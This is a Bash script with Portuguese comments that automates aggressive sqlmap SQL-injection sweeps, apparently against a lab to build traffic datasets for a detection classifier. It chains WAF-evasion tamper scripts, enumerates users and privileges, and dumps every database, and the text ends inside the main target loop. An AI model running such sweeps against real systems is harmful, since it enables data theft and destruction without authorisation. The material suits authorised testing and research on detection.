#!/usr/bin/env bash
# =============================================================================
# sqlmap-sweep.sh — bateria agressiva de sqlmap para laboratório autorizado
# v2.1 — correções verificadas contra sqlmap 1.10.7
#
# AVISO:
#   - Executa level=5, risk=3, técnicas invasivas e dump completo por padrão.
#   - Pode alterar ou destruir dados em pontos de injeção dentro de UPDATE/DELETE.
#   - Use somente em ambiente descartável, isolado e formalmente autorizado.
#
# MUDANÇAS NESTA VERSÃO (v2.1):
#   [FIX] --second-order não existe no sqlmap; o nome correto é --second-url.
#   [FIX] tamper nonrecursivereplacement foi removido do sqlmap; retirado do 23.
#   [FIX] --list-tampers/--version no startup agora usam --batch e timeout.
#         Sem isso o script podia travar antes do primeiro passe (acontece em
#         lab isolado, quando o sqlmap fica preso na checagem de versão).
#   [FIX] passes 90_/99_ não recebem mais --flush-session: o dump reaproveita
#         a sessão da enumeração em vez de refazer a detecção inteira.
#   [NEW] UA_MODE=fixed|random|mixed — ver nota sobre viés de dataset abaixo.
#   [NEW] coluna ua_mode no ledger (agora 20 colunas).
#   [NEW] aviso quando TIME_DELAY_SEC >= HTTP_TIMEOUT.
#
# NOTA SOBRE VIÉS DE DATASET (importante se o alvo é treinar classificador):
#   UA_MODE=fixed marca todo o tráfego de ataque com um User-Agent próprio.
#   Isso torna a rotulagem trivial (grep no access.log) e o treino inútil: o
#   modelo aprende a string, não o padrão de injeção. O default é "mixed":
#   metade dos passes vai com UA fixo (rotulável) e metade com --random-agent
#   (treinável). A coluna ua_mode no ledger diz qual foi qual.
#
# Requisitos: Bash 4+, GNU coreutils, Python 3 e sqlmap.
#
# Formato de alvos.txt (delimitador "|"):
#   METODO|URL|DATA
#   GET|http://dvwa.lab.local/vulnerabilities/sqli/?id=1&Submit=Submit|
#   POST|http://dvwa.lab.local/login.php|username=admin&password=teste
#   PUT|http://api.lab.local/v1/users/1|{"nome":"teste"}
#   PATCH|http://api.lab.local/v1/users/1|{"nome":"alterado"}
#   DELETE|http://api.lab.local/v1/users/1|id=1
#
# Uma linha sem "|" é tratada como GET.
# O campo DATA pode conter "|"; tudo após o segundo delimitador é preservado.
#
# Formato de escopo.txt:
#   dvwa.lab.local
#   api.lab.local
#   *.sqli.lab.local
#
# Execução:
#   chmod +x sqlmap-sweep.sh
#   AUTHORIZED_SECURITY_TESTING=YES DANGEROUS_ACK=YES ./sqlmap-sweep.sh
# =============================================================================

set -uo pipefail
umask 077

# -------------------------------- CONFIG ------------------------------------
TARGETS_FILE="${TARGETS_FILE:-alvos.txt}"
SCOPE_FILE="${SCOPE_FILE:-escopo.txt}"
RUN_ID="${RUN_ID:-$(date -u +%Y%m%dT%H%M%SZ)-$$}"
OUTDIR="${OUTDIR:-./sqlmap-out/$RUN_ID}"
SQLMAP="${SQLMAP:-sqlmap}"

# Travas contra execução acidental. Não reduzem a agressividade do teste.
AUTHORIZED_SECURITY_TESTING="${AUTHORIZED_SECURITY_TESTING:-}"
DANGEROUS_ACK="${DANGEROUS_ACK:-}"

COOKIE="${COOKIE:-}"
PROXY="${PROXY:-}"
DBMS="${DBMS:-}"
PARAMS="${PARAMS:-}"
PARAM_EXCLUDE="${PARAM_EXCLUDE:-}"
HEADER_FILE="${HEADER_FILE:-}"
CONTENT_TYPE="${CONTENT_TYPE:-}"

THREADS="${THREADS:-8}"
DELAY="${DELAY:-0}"
TIME_DELAY_SEC="${TIME_DELAY_SEC:-5}"  # atraso usado em técnicas time-based
HTTP_TIMEOUT="${HTTP_TIMEOUT:-30}"     # timeout real da conexão HTTP
RETRIES="${RETRIES:-3}"

CSRF_TOKEN="${CSRF_TOKEN:-}"
CSRF_URL="${CSRF_URL:-}"
CSRF_METHOD="${CSRF_METHOD:-}"
CSRF_DATA="${CSRF_DATA:-}"
CSRF_RETRIES="${CSRF_RETRIES:-1}"

SAFE_URL="${SAFE_URL:-}"
SAFE_POST="${SAFE_POST:-}"
SAFE_REQ="${SAFE_REQ:-}"
SAFE_FREQ="${SAFE_FREQ:-10}"

# [FIX] a flag correta do sqlmap é --second-url (não --second-order).
# O nome da variável foi mantido para não quebrar configs existentes.
SECOND_ORDER_URL="${SECOND_ORDER_URL:-}"
SECOND_REQ="${SECOND_REQ:-}"

RUN_ENUM="${RUN_ENUM:-0}"
RUN_DUMP="${RUN_DUMP:-0}"
RUN_ALL_DBMS_TAMPERS="${RUN_ALL_DBMS_TAMPERS:-0}"
RUN_CRAWL="${RUN_CRAWL:-0}"
RUN_TAMPERS="${RUN_TAMPERS:-1}"
COOLDOWN="${COOLDOWN:-5}"
VERBOSE="${VERBOSE:-3}"
TRAFFIC="${TRAFFIC:-1}"

# [NEW] fixed = UA próprio em tudo (rotulagem fácil, dataset viciado)
#       random = --random-agent em tudo (dataset limpo, rotulagem por janela)
#       mixed  = alterna por passe (default)
UA_MODE="${UA_MODE:-mixed}"
USER_AGENT="${USER_AGENT:-TCC-SQLMap-Sweep/2.1}"

# Compatibilidade com a v2.0: RANDOM_AGENT=1 equivale a UA_MODE=random.
RANDOM_AGENT="${RANDOM_AGENT:-}"
[[ "$RANDOM_AGENT" == "1" ]] && UA_MODE="random"
[[ "$RANDOM_AGENT" == "0" ]] && UA_MODE="fixed"

# Se 1, cada passe recebe diretório de sessão próprio e não reutiliza resultados.
ISOLATE_PASSES="${ISOLATE_PASSES:-1}"
RESET_SESSION_EACH_PASS="${RESET_SESSION_EACH_PASS:-1}"

# [NEW] Se 1, os passes 90_/99_ compartilham sessão: a enumeração faz a detecção
# uma vez e o dump reaproveita, em vez de refazer BEUSTQ em level=5/risk=3.
REUSE_SESSION_FOR_ENUM="${REUSE_SESSION_FOR_ENUM:-1}"

# Permite corpo vazio em POST/PUT/PATCH/DELETE quando explicitamente necessário.
ALLOW_EMPTY_BODY="${ALLOW_EMPTY_BODY:-0}"

# Se 1, um tamper ausente faz o passe ser pulado em vez de falhar no sqlmap.
CHECK_TAMPERS="${CHECK_TAMPERS:-1}"

# Teto para os comandos de inventário do startup.
STARTUP_TIMEOUT="${STARTUP_TIMEOUT:-60}"

# -------------------------------- HELPERS -----------------------------------
die() { printf '[!] %s\n' "$*" >&2; exit 1; }
warn() { printf '[!] %s\n' "$*" >&2; }
info() { printf '[*] %s\n' "$*"; }

require_cmd() {
  command -v "$1" >/dev/null 2>&1 || die "comando obrigatório não encontrado: $1"
}

trim() {
  local value="$1"
  value="${value#"${value%%[![:space:]]*}"}"
  value="${value%"${value##*[![:space:]]}"}"
  printf '%s' "$value"
}

lower() { tr '[:upper:]' '[:lower:]' <<<"$1"; }

host_of() {
  python3 - "$1" <<'PY'
import sys
from urllib.parse import urlsplit

url = sys.argv[1]
try:
    parsed = urlsplit(url)
except ValueError:
    raise SystemExit(2)

if parsed.scheme.lower() not in {"http", "https"} or not parsed.hostname:
    raise SystemExit(2)

print(parsed.hostname.rstrip(".").lower())
PY
}

validate_url() {
  python3 - "$1" <<'PY'
import sys
from urllib.parse import urlsplit

url = sys.argv[1]
try:
    parsed = urlsplit(url)
except ValueError as exc:
    print(f"URL inválida: {exc}", file=sys.stderr)
    raise SystemExit(1)

if parsed.scheme.lower() not in {"http", "https"}:
    print("a URL deve usar http:// ou https://", file=sys.stderr)
    raise SystemExit(1)
if not parsed.hostname:
    print("a URL não possui hostname", file=sys.stderr)
    raise SystemExit(1)
if parsed.fragment:
    print("fragmentos #... não são enviados ao servidor", file=sys.stderr)
    raise SystemExit(1)
if any(c in url for c in "\r\n\t"):
    print("a URL contém caractere de controle", file=sys.stderr)
    raise SystemExit(1)
PY
}

# Aceita host exato e wildcard no formato *.lab.local.
in_scope() {
  local url="$1" host entry suffix
  host="$(host_of "$url")" || return 1

  while IFS= read -r entry || [[ -n "$entry" ]]; do
    entry="${entry%%#*}"
    entry="$(trim "${entry//$'\r'/}")"
    [[ -z "$entry" ]] && continue
    entry="$(lower "${entry%.}")"

    if [[ "$entry" == \*.* ]]; then
      suffix="${entry#*.}"
      [[ "$host" == *".$suffix" ]] && return 0
    elif [[ "$host" == "$entry" ]]; then
      return 0
    fi
  done < "$SCOPE_FILE"

  return 1
}

is_body_method() {
  case "$1" in
    POST|PUT|PATCH|DELETE) return 0 ;;
    *) return 1 ;;
  esac
}

method_applies() {
  local selector="$1" method="$2"
  case "$selector" in
    ALL) return 0 ;;
    GET) [[ "$method" == "GET" ]] ;;
    BODY) is_body_method "$method" ;;
    POST) [[ "$method" == "POST" ]] ;;
    *) return 1 ;;
  esac
}

normalize_dbms() {
  local value
  value="$(lower "$(trim "$1")")"
  case "$value" in
    ""|any|auto) echo "any" ;;
    mysql|mariadb) echo "mysql" ;;
    mssql|"microsoft sql server"|sqlserver|"sql server") echo "mssql" ;;
    postgresql|postgres|pgsql) echo "postgresql" ;;
    oracle) echo "oracle" ;;
    sqlite) echo "sqlite" ;;
    *) echo "$value" ;;
  esac
}

dbms_applies() {
  local selector="$1" configured
  configured="$(normalize_dbms "$DBMS")"

  [[ "$selector" == "any" ]] && return 0
  [[ "$RUN_ALL_DBMS_TAMPERS" == "1" && "$configured" == "any" ]] && return 0
  [[ "$configured" == "$selector" ]]
}

sha256_text() { printf '%s' "$1" | sha256sum | awk '{print $1}'; }

fsize() { [[ -f "$1" ]] && stat -c '%s' "$1" 2>/dev/null || printf '0\n'; }

human() {
  local bytes="$1"
  if command -v numfmt >/dev/null 2>&1; then
    numfmt --to=iec-i --suffix=B "$bytes" 2>/dev/null || printf '%sB\n' "$bytes"
  else
    printf '%sB\n' "$bytes"
  fi
}

# Conta uma linha por requisição no tráfego do sqlmap (-t). Sem tráfego,
# usa [PAYLOAD] apenas como aproximação (subestima: ignora sondagem e WAF probe).
count_reqs() {
  local traffic="$1" log="$2" count=""

  if [[ -s "$traffic" ]]; then
    count="$(grep -Ec 'HTTP request \[#[0-9]+\]:' "$traffic" 2>/dev/null || true)"
    [[ "$count" =~ ^[0-9]+$ ]] || count=0
    printf '%s\texata\n' "$count"
  else
    count="$(grep -c '\[PAYLOAD\]' "$log" 2>/dev/null || true)"
    [[ "$count" =~ ^[0-9]+$ ]] || count=0
    printf '%s\taprox\n' "$count"
  fi
}

content_type_for() {
  local data="$1" stripped
  [[ -n "$CONTENT_TYPE" ]] && { printf '%s' "$CONTENT_TYPE"; return; }

  stripped="${data#"${data%%[![:space:]]*}"}"
  if [[ "$stripped" == \{* || "$stripped" == \[* ]]; then
    printf 'application/json'
  elif [[ "$stripped" == \<* ]]; then
    printf 'application/xml'
  else
    printf 'application/x-www-form-urlencoded'
  fi
}

is_enum_pass() {
  case "$1" in
    90_*|99_*) return 0 ;;
    *) return 1 ;;
  esac
}

# -------------------------------- CHECKS ------------------------------------
[[ "$AUTHORIZED_SECURITY_TESTING" == "YES" ]] || die \
  "execução bloqueada. Use AUTHORIZED_SECURITY_TESTING=YES somente em ambiente autorizado."
[[ "$DANGEROUS_ACK" == "YES" ]] || die \
  "execução bloqueada. Use DANGEROUS_ACK=YES somente em laboratório autorizado e descartável."

require_cmd bash
require_cmd python3
require_cmd sha256sum
require_cmd awk
require_cmd grep
require_cmd stat
require_cmd date
require_cmd timeout

command -v "$SQLMAP" >/dev/null 2>&1 || die "sqlmap não encontrado: $SQLMAP"
[[ -f "$TARGETS_FILE" ]] || die "arquivo de alvos não existe: $TARGETS_FILE"
[[ -f "$SCOPE_FILE" ]] || die "arquivo de escopo não existe: $SCOPE_FILE"

case "$UA_MODE" in
  fixed|random|mixed) ;;
  *) die "UA_MODE inválido: $UA_MODE (use fixed, random ou mixed)" ;;
esac

if [[ "$UA_MODE" == "fixed" ]]; then
  warn "UA_MODE=fixed: todo o tráfego de ataque leva o UA '$USER_AGENT'."
  warn "Remova essa coluna antes de treinar, ou o classificador aprende a string."
fi

if (( TIME_DELAY_SEC >= HTTP_TIMEOUT )); then
  warn "TIME_DELAY_SEC=$TIME_DELAY_SEC >= HTTP_TIMEOUT=$HTTP_TIMEOUT:"
  warn "as técnicas time-based vão estourar o timeout antes de confirmar a injeção."
fi

if [[ -n "$SAFE_URL" && -n "$SAFE_REQ" ]]; then
  die "use apenas SAFE_URL ou SAFE_REQ, não ambos"
fi
if [[ -n "$SAFE_POST" && -z "$SAFE_URL" ]]; then
  die "SAFE_POST exige SAFE_URL"
fi
if [[ -n "$CSRF_URL" && -z "$CSRF_TOKEN" ]]; then
  warn "CSRF_URL foi definido sem CSRF_TOKEN; o sqlmap poderá ignorar a URL de CSRF"
fi
if [[ -n "$HEADER_FILE" && ! -f "$HEADER_FILE" ]]; then
  die "HEADER_FILE não existe: $HEADER_FILE"
fi
for req_file in "$SAFE_REQ" "$SECOND_REQ"; do
  [[ -n "$req_file" && ! -f "$req_file" ]] && die "arquivo de requisição não existe: $req_file"
done

for auxiliary_url in "$SAFE_URL" "$CSRF_URL" "$SECOND_ORDER_URL"; do
  [[ -z "$auxiliary_url" ]] && continue
  validate_url "$auxiliary_url" || die "URL auxiliar inválida: $auxiliary_url"
  in_scope "$auxiliary_url" || die "URL auxiliar fora do escopo: $auxiliary_url"
done

mkdir -p \
  "$OUTDIR/logs" \
  "$OUTDIR/traffic" \
  "$OUTDIR/sqlmap-data" \
  "$OUTDIR/meta/commands"

# [FIX] --batch + timeout: sem isso o sqlmap pode ficar preso na checagem de
# versão e travar o script inteiro antes do primeiro passe.
timeout "$STARTUP_TIMEOUT" "$SQLMAP" --version --batch \
  > "$OUTDIR/meta/sqlmap-version.txt" 2>&1 || \
  warn "não foi possível registrar a versão do sqlmap (timeout ${STARTUP_TIMEOUT}s)"

TAMPER_LIST_FILE="$OUTDIR/meta/sqlmap-tampers.txt"
if ! timeout "$STARTUP_TIMEOUT" "$SQLMAP" --list-tampers --batch \
     > "$TAMPER_LIST_FILE" 2>&1; then
  warn "--list-tampers não terminou em ${STARTUP_TIMEOUT}s."
  if [[ -s "$TAMPER_LIST_FILE" ]]; then
    warn "usando a lista parcial que foi gravada."
  else
    warn "validação de tampers desativada nesta execução."
    CHECK_TAMPERS=0
  fi
fi

# ----------------------------- FLAGS COMUNS ---------------------------------
COMMON=(
  --batch
  --answers="quit=N,crack=N,dict=N,continue=Y,follow=N,keep=N"
  --parse-errors
  --disable-coloring
  --no-truncate
  -v "$VERBOSE"
  --threads="$THREADS"
  --delay="$DELAY"
  --time-sec="$TIME_DELAY_SEC"
  --timeout="$HTTP_TIMEOUT"
  --retries="$RETRIES"
)

[[ -n "$COOKIE" ]] && COMMON+=(--cookie="$COOKIE")
[[ -n "$PROXY" ]] && COMMON+=(--proxy="$PROXY")
[[ -n "$DBMS" ]] && COMMON+=(--dbms="$DBMS")
[[ -n "$PARAMS" ]] && COMMON+=(-p "$PARAMS")
[[ -n "$PARAM_EXCLUDE" ]] && COMMON+=(--param-exclude="$PARAM_EXCLUDE")

[[ -n "$CSRF_TOKEN" ]] && COMMON+=(--csrf-token="$CSRF_TOKEN")
[[ -n "$CSRF_URL" ]] && COMMON+=(--csrf-url="$CSRF_URL")
[[ -n "$CSRF_METHOD" ]] && COMMON+=(--csrf-method="$CSRF_METHOD")
[[ -n "$CSRF_DATA" ]] && COMMON+=(--csrf-data="$CSRF_DATA")
[[ -n "$CSRF_TOKEN" ]] && COMMON+=(--csrf-retries="$CSRF_RETRIES")

if [[ -n "$SAFE_URL" ]]; then
  COMMON+=(--safe-url="$SAFE_URL" --safe-freq="$SAFE_FREQ")
  [[ -n "$SAFE_POST" ]] && COMMON+=(--safe-post="$SAFE_POST")
elif [[ -n "$SAFE_REQ" ]]; then
  COMMON+=(--safe-req="$SAFE_REQ" --safe-freq="$SAFE_FREQ")
fi

# [FIX] --second-order não existe; a flag é --second-url.
[[ -n "$SECOND_ORDER_URL" ]] && COMMON+=(--second-url="$SECOND_ORDER_URL")
[[ -n "$SECOND_REQ" ]] && COMMON+=(--second-req="$SECOND_REQ")

if [[ -n "$HEADER_FILE" ]]; then
  while IFS= read -r header || [[ -n "$header" ]]; do
    header="${header//$'\r'/}"
    trimmed_header="$(trim "$header")"
    [[ -z "$trimmed_header" || "$trimmed_header" == \#* ]] && continue
    COMMON+=(-H "$header")
  done < "$HEADER_FILE"
fi

# ----------------------------- MATRIZ DE PASSES -----------------------------
PASS_NAMES=()
PASS_METHODS=()
PASS_DBMS=()
PASS_FLAGS=()
PASS_TAMPERS=()

add_pass() {
  PASS_NAMES+=("$1")
  PASS_METHODS+=("$2")
  PASS_DBMS+=("$3")
  PASS_FLAGS+=("$4")
  PASS_TAMPERS+=("$5")
}

# Cobertura de técnicas.
add_pass "01_full_cobertura"  "ALL"  "any"        "--level=5 --risk=3 --technique=BEUSTQ" ""
add_pass "02_boolean_error"   "ALL"  "any"        "--level=5 --risk=3 --technique=BE"     ""
add_pass "03_union_profundo"  "ALL"  "any"        "--level=5 --risk=3 --technique=U --union-cols=1-50 --union-char=NULL" ""
add_pass "04_time_stacked"    "ALL"  "any"        "--level=5 --risk=3 --technique=TS"     ""
add_pass "05_inline_query"    "ALL"  "any"        "--level=5 --risk=3 --technique=Q"      ""

# Descoberta e variações de transporte.
add_pass "06_forms_crawl"     "GET"  "any"        "--level=5 --risk=3 --forms --crawl=3 --crawl-exclude=logout|sair|logoff|signout" ""
add_pass "07_hpp"             "ALL"  "any"        "--level=5 --risk=3 --hpp --technique=BEUSTQ" ""
add_pass "08_chunked"         "BODY" "any"        "--level=5 --risk=3 --chunked --technique=BEUSTQ" ""
add_pass "09_skip_waf_probe"  "ALL"  "any"        "--level=5 --risk=3 --skip-waf --technique=BEUSTQ" ""

# Estratégias genéricas de invalidação/comparação.
add_pass "10_invalid_bignum"   "ALL"  "any"        "--level=5 --risk=3 --invalid-bignum --technique=BEUSTQ" ""
add_pass "11_invalid_logical"  "ALL"  "any"        "--level=5 --risk=3 --invalid-logical --technique=BEUSTQ" ""
add_pass "12_invalid_string"   "ALL"  "any"        "--level=5 --risk=3 --invalid-string --technique=BEUSTQ" ""
add_pass "13_no_cast_escape"   "ALL"  "any"        "--level=5 --risk=3 --no-cast --no-escape --technique=BEUSTQ" ""

# Tampers genéricos, cada cadeia em passe independente.
add_pass "20_tamper_space"     "ALL"  "any"        "--level=5 --risk=3 --technique=BEUSTQ" "space2comment,between,randomcase"
add_pass "21_tamper_urlencode" "ALL"  "any"        "--level=5 --risk=3 --technique=BEUSTQ" "charencode,chardoubleencode"
add_pass "22_tamper_quotes"    "ALL"  "any"        "--level=5 --risk=3 --technique=BEUSTQ" "apostrophemask,apostrophenullencode"
# [FIX] nonrecursivereplacement foi removido do sqlmap e derrubava este passe.
add_pass "23_tamper_keywords"  "ALL"  "any"        "--level=5 --risk=3 --technique=BEUSTQ" "randomcase,unionalltounion,uppercase"
add_pass "24_tamper_comments"  "ALL"  "any"        "--level=5 --risk=3 --technique=BEUSTQ" "randomcomments,space2comment"

# MySQL/MariaDB — cadeias modernas e legadas separadas.
add_pass "30_mysql_versioned"  "ALL"  "mysql"      "--level=5 --risk=3 --technique=BEUSTQ" "versionedkeywords,versionedmorekeywords,space2mysqlblank"
add_pass "31_mysql_legacy"     "ALL"  "mysql"      "--level=5 --risk=3 --technique=BEUSTQ" "halfversionedmorekeywords,space2mysqldash"
add_pass "32_mysql_functions"  "ALL"  "mysql"      "--level=5 --risk=3 --technique=BEUSTQ" "ifnull2ifisnull,concat2concatws"
add_pass "33_mysql_modsec"     "ALL"  "mysql"      "--level=5 --risk=3 --technique=BEUSTQ" "modsecurityversioned,modsecurityzeroversioned"
add_pass "34_mysql_hashspace"  "ALL"  "mysql"      "--level=5 --risk=3 --technique=BEUSTQ" "space2hash,space2morehash"

# Microsoft SQL Server / IIS.
add_pass "40_mssql_iis"        "ALL"  "mssql"      "--level=5 --risk=3 --technique=BEUSTQ" "charunicodeencode,percentage,space2mssqlblank"
add_pass "41_mssql_keywords"   "ALL"  "mssql"      "--level=5 --risk=3 --technique=BEUSTQ" "sp_password,randomcase,space2comment"
add_pass "42_mssql_compare"    "ALL"  "mssql"      "--level=5 --risk=3 --technique=BEUSTQ" "equaltolike,greatest"
add_pass "43_mssql_hashspace"  "ALL"  "mssql"      "--level=5 --risk=3 --technique=BEUSTQ" "space2mssqlhash,space2dash"

# PostgreSQL, Oracle e SQLite em passes separados.
add_pass "50_postgresql"        "ALL" "postgresql" "--level=5 --risk=3 --technique=BEUSTQ" "equaltolike,greatest,space2comment"
add_pass "51_postgresql_quotes" "ALL" "postgresql" "--level=5 --risk=3 --technique=BEUSTQ" "apostrophemask,randomcase,space2comment"
add_pass "60_oracle"            "ALL" "oracle"     "--level=5 --risk=3 --technique=BEUSTQ" "between,greatest,space2comment"
add_pass "61_oracle_keywords"   "ALL" "oracle"     "--level=5 --risk=3 --technique=BEUSTQ" "equaltolike,randomcase,space2comment"
add_pass "70_sqlite"            "ALL" "sqlite"     "--level=5 --risk=3 --technique=BEUSTQ" "between,randomcase,space2comment"

ENUM_FLAGS=(
  --level=5 --risk=3 --technique=BEUSTQ
  --fingerprint
  --banner --hostname --current-user --current-db --is-dba
  --privileges --roles
  --dbs --tables --columns --schema --count
  --exclude-sysdbs
)

# [FIX] sem --technique/--level aqui: com REUSE_SESSION_FOR_ENUM=1 o dump
# reaproveita a injeção já confirmada em 90_ em vez de redetectar do zero.
DUMP_FLAGS=(
  --dump-all --exclude-sysdbs
)

# ----------------------------- LEITURA DE ALVOS -----------------------------
mapfile -t RAW_TARGETS < <(
  awk '{ sub(/\r$/, ""); if ($0 !~ /^[[:space:]]*(#|$)/) print }' "$TARGETS_FILE"
)
[[ ${#RAW_TARGETS[@]} -gt 0 ]] || die "nenhum alvo válido em $TARGETS_FILE"

METHODS=()
URLS=()
DATAS=()

for line in "${RAW_TARGETS[@]}"; do
  if [[ "$line" == *"|"* ]]; then
    method="${line%%|*}"
    remainder="${line#*|}"
    if [[ "$remainder" == *"|"* ]]; then
      url="${remainder%%|*}"
      data="${remainder#*|}"
    else
      url="$remainder"
      data=""
    fi
  else
    method="GET"
    url="$line"
    data=""
  fi

  method="$(tr '[:lower:]' '[:upper:]' <<<"$(trim "$method")")"
  url="$(trim "$url")"

  case "$method" in
    GET|POST|PUT|PATCH|DELETE) ;;
    *) die "método não suportado: $method" ;;
  esac

  validate_url "$url" || die "alvo inválido: $url"
  in_scope "$url" || die "alvo fora do escopo: $url (host: $(host_of "$url"))"

  if is_body_method "$method" && [[ -z "$data" && "$ALLOW_EMPTY_BODY" != "1" ]]; then
    die "$method sem corpo de dados: $url. Use ALLOW_EMPTY_BODY=1 se isso for intencional."
  fi

  METHODS+=("$method")
  URLS+=("$url")
  DATAS+=("$data")
done

# ----------------------------- LEDGER / ESTADO ------------------------------
# [NEW] 20 colunas: ua_mode entrou entre traffic_bytes e log.
LEDGER="$OUTDIR/janelas.tsv"
printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' \
  run_id target_index method target body_sha256 pass \
  start_iso end_iso start_epoch end_epoch duration_s exit_code \
  requests count_kind log_bytes traffic_bytes ua_mode log traffic status \
  > "$LEDGER"

TOTAL_REQ=0
TOTAL_LOG=0
TOTAL_TRF=0
TOTAL_PASSES=0
TOTAL_SKIPPED=0
PASS_COUNTER=0
CURRENT_PID=""

on_interrupt() {
  warn "interrupção recebida"
  if [[ -n "$CURRENT_PID" ]]; then
    kill -TERM "$CURRENT_PID" 2>/dev/null || true
  fi
  exit 130
}
trap on_interrupt INT TERM

# Confere se todos os scripts de uma cadeia aparecem na saída de --list-tampers.
tamper_chain_available() {
  local chain="$1" item
  [[ -z "$chain" || "$CHECK_TAMPERS" != "1" ]] && return 0
  [[ -s "$TAMPER_LIST_FILE" ]] || return 0

  IFS=',' read -r -a items <<< "$chain"
  for item in "${items[@]}"; do
    if ! grep -Eiq "(^|[^[:alnum:]_])${item}(\.py)?([^[:alnum:]_]|$)" "$TAMPER_LIST_FILE"; then
      return 1
    fi
  done
  return 0
}

write_ledger_row() {
  printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' \
    "$@" >> "$LEDGER"
}

record_skipped() {
  local target_index="$1" method="$2" target="$3" data="$4" name="$5" reason="$6"
  write_ledger_row \
    "$RUN_ID" "$target_index" "$method" "$target" "$(sha256_text "$data")" "$name" \
    "" "" "" "" "0" "" "0" "skipped" "0" "0" "-" "" "" "skipped:$reason"
  TOTAL_SKIPPED=$((TOTAL_SKIPPED + 1))
  printf '[-] %s: %s\n' "$name" "$reason"
}

# Decide o UA deste passe. Em mixed, alterna por ordem de execução.
ua_flags_for() {
  local mode="$1"
  case "$mode" in
    fixed)  printf '%s' "--user-agent=$USER_AGENT" ;;
    random) printf '%s' "--random-agent" ;;
  esac
}

ua_mode_for_pass() {
  case "$UA_MODE" in
    fixed)  echo "fixed" ;;
    random) echo "random" ;;
    mixed)  (( PASS_COUNTER % 2 == 0 )) && echo "fixed" || echo "random" ;;
  esac
}

run_pass() {
  local target_index="$1" method="$2" target="$3" data="$4" name="$5" tamper_chain="$6"
  shift 6
  local flags=("$@")

  local host slug target_hash body_hash tag log traffic pass_output ua_mode
  host="$(host_of "$target")"
  slug="$(tr -cs '[:alnum:]_-' '_' <<<"$host" | sed 's/^_//;s/_$//')"
  target_hash="$(printf '%s\0%s\0%s' "$method" "$target" "$data" | sha256sum | awk '{print substr($1,1,16)}')"
  body_hash="$(sha256_text "$data")"
  tag="$(printf 't%03d__%s__%s__%s__%s' "$target_index" "$slug" "$target_hash" "$method" "$name")"
  log="$OUTDIR/logs/${tag}.log"
  traffic="$OUTDIR/traffic/${tag}.traffic"

  ua_mode="$(ua_mode_for_pass)"
  PASS_COUNTER=$((PASS_COUNTER + 1))

  local request_flags=()
  if is_body_method "$method"; then
    request_flags+=(--method="$method" --data="$data")
    request_flags+=(-H "Content-Type: $(content_type_for "$data")")
  elif [[ "$method" != "GET" ]]; then
    request_flags+=(--method="$method")
  fi

  request_flags+=("$(ua_flags_for "$ua_mode")")

  # -t é a única forma da flag de tráfego; --traffic-file não existe.
  [[ "$TRAFFIC" == "1" ]] && request_flags+=(-t "$traffic")
  [[ -n "$tamper_chain" ]] && request_flags+=(--tamper="$tamper_chain")

  # [FIX] enumeração e dump compartilham diretório e sessão entre si.
  if is_enum_pass "$name" && [[ "$REUSE_SESSION_FOR_ENUM" == "1" ]]; then
    pass_output="$(printf '%s/sqlmap-data/t%03d__%s__enum' "$OUTDIR" "$target_index" "$target_hash")"
    mkdir -p "$pass_output"
    request_flags+=(--output-dir="$pass_output")
  else
    if [[ "$ISOLATE_PASSES" == "1" ]]; then
      pass_output="$OUTDIR/sqlmap-data/$tag"
    else
      pass_output="$OUTDIR/sqlmap-data/shared"
    fi
    mkdir -p "$pass_output"
    request_flags+=(--output-dir="$pass_output")
    [[ "$RESET_SESSION_EACH_PASS" == "1" ]] && request_flags+=(--flush-session --fresh-queries)
  fi

  local start_epoch start_iso end_epoch end_iso rc duration count_info reqs count_kind
  local log_bytes traffic_bytes

  start_epoch="$(date -u +%s)"
  start_iso="$(date -u -d "@$start_epoch" +%Y-%m-%dT%H:%M:%SZ)"
  printf '[>] [%03d] %-6s %-24s ua=%-6s -> %s\n' \
    "$target_index" "$method" "$name" "$ua_mode" "$target"

  local command_file
  local -a cmd
  command_file="$OUTDIR/meta/commands/${tag}.sh"
  cmd=("$SQLMAP" -u "$target" "${COMMON[@]}" "${request_flags[@]}" "${flags[@]}")

  {
    printf '#!/usr/bin/env bash\n'
    printf 'exec '
    printf '%q ' "${cmd[@]}"
    printf '\n'
  } > "$command_file"
  chmod 700 "$command_file"

  "${cmd[@]}" > "$log" 2>&1 &
  CURRENT_PID=$!
  wait "$CURRENT_PID"
  rc=$?
  CURRENT_PID=""

  end_epoch="$(date -u +%s)"
  end_iso="$(date -u -d "@$end_epoch" +%Y-%m-%dT%H:%M:%SZ)"
  duration=$((end_epoch - start_epoch))

  count_info="$(count_reqs "$traffic" "$log")"
  reqs="${count_info%%$'\t'*}"
  count_kind="${count_info#*$'\t'}"
  [[ "$reqs" =~ ^[0-9]+$ ]] || reqs=0

  log_bytes="$(fsize "$log")"
  traffic_bytes="$(fsize "$traffic")"

  write_ledger_row \
    "$RUN_ID" "$target_index" "$method" "$target" "$body_hash" "$name" \
    "$start_iso" "$end_iso" "$start_epoch" "$end_epoch" "$duration" "$rc" \
    "$reqs" "$count_kind" "$log_bytes" "$traffic_bytes" "$ua_mode" \
    "$log" "$traffic" "executed"

  TOTAL_REQ=$((TOTAL_REQ + reqs))
  TOTAL_LOG=$((TOTAL_LOG + log_bytes))
  TOTAL_TRF=$((TOTAL_TRF + traffic_bytes))
  TOTAL_PASSES=$((TOTAL_PASSES + 1))

  printf '    %s req (%s) | %ss | rc=%s | acumulado=%s req\n' \
    "$reqs" "$count_kind" "$duration" "$rc" "$TOTAL_REQ"

  (( COOLDOWN > 0 )) && sleep "$COOLDOWN"
  return 0
}

# -------------------------------- EXECUÇÃO ----------------------------------
info "run_id: $RUN_ID"
info "alvos: ${#URLS[@]}"
info "passes definidos: ${#PASS_NAMES[@]} + enumeração/dump"
info "saída: $OUTDIR"
info "modo agressivo: level=5, risk=3, dump-all=$RUN_DUMP, ua=$UA_MODE"
if [[ "$(normalize_dbms "$DBMS")" == "any" && "$RUN_ALL_DBMS_TAMPERS" == "1" ]]; then
  info "DBMS não definido: rodando tampers de todos os SGBDs (execução longa)."
fi
echo

for i in "${!URLS[@]}"; do
  target_index=$((i + 1))
  method="${METHODS[$i]}"
  target="${URLS[$i]}"
  data="${DATAS[$i]}"

  echo "============================================================================="
  printf 'ALVO [%03d]: [%s] %s\n' "$target_index" "$method" "$target"
  echo "============================================================================="

